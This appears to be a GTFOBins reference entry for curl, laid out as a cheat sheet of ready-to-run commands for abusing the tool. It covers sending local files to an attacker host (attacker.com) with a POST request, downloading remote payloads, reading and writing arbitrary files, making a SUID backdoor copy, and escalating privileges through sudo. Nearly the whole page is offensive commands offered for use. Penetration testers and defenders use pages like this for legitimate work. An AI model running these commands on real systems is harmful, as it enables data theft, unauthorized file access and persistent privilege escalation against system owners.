# GTFOBin: curl

## File upload

It can exfiltrate files on the network.

Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.

```
URL=http://attacker.com/
LFILE=file_to_send
curl -X POST -d "@$LFILE" $URL
```

## File download

It can download remote files.

Fetch a remote file via HTTP GET request.

```
URL=http://attacker.com/file_to_get
LFILE=file_to_save
curl $URL -o $LFILE
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

The file path must be absolute.

```
LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
curl "file://$TF" -o "$LFILE"
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file path must be absolute.

```
LFILE=/tmp/file_to_read
curl file://$LFILE
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

Fetch a remote file via HTTP GET request.

```
sudo install -m =xs $(which curl) .

URL=http://attacker.com/file_to_get
LFILE=file_to_save
./curl $URL -o $LFILE
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Fetch a remote file via HTTP GET request.

```
URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo curl $URL -o $LFILE
```